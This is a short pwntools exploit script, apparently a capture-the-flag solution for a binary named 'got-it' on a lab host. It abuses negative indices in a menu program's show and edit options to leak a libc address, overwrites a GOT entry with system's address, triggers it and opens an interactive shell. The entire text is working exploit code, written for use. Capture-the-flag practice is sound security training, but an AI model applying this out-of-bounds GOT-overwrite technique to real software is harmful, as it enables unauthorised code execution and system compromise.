from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process("./got-it")
s=remote("192.168.3.253",51006)
libc=ELF("../dist/libc.so.6")

def menu(ch):
    s.sendlineafter(b">> ",str(ch).encode())
def show(idx):
    menu(2)
    s.sendlineafter(b"id: ",str(idx).encode())
    s.recvuntil(b"name: ")
    return s.recvline()[:-1]
def edit(idx,name):
    menu(3)
    s.sendlineafter(b"id: ",str(idx).encode())
    s.sendafter(b"name: ",name)
dat=show(-17)
info(dat)
libc.address=u64(dat.ljust(8,b"\x00"))-libc.sym.puts
success(hex(libc.address))
edit(-11,p64(libc.sym.system)[:6])
menu(8227)
s.interactive()
